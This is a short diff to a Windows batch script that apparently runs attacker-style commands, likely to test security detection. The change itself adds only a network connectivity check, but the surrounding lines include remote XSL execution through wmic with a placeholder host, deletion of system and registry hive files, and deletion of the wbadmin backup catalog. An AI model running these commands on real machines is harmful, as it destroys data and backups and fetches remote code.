@@ -316,6 +316,8 @@ wmic.exe os get /format:"http://blah/foo.xsl"
 ECHO ============================
 cmd.exe /c powershell.exe (Invoke-WebRequest -uri "https://api.ipify.org/").Content
 ECHO ============================
+cmd.exe /c powershell.exe Test-NetConnection -ComputerName google.com -port 80 -InformationLevel detailed
+ECHO ============================
 del *sys* & del *hive*
 ECHO ============================
 wbadmin delete catalog -quiet
